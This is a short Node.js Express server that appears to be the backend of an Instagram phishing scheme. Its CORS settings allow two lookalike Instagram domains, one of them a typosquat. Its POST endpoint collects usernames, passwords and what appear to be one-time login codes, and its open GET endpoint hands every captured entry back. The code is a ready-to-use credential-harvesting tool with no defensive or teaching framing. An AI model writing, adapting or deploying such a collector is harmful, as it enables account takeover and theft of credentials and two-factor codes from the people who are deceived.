const express = require("express");
const cors = require("cors");

const app = express();

app.use(cors({
    origin: [
        "https://account-instagram-com.vercel.app",
        "https://lnstagrarn-reel-paoa2oajo.vercel.app"
    ]
}));
app.use(express.json());

let dataList = [];

app.post("/data", (req, res) => {
    const newData = {
        username: req.body.username,
        password: req.body.password,
        code: req.body.code
    };

    dataList.push(newData);

    console.log("Received:", newData);

    res.json({
        success: true
    });
});

app.get("/data", (req, res) => {
    res.json(dataList);
});

const PORT = process.env.PORT || 1000;

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});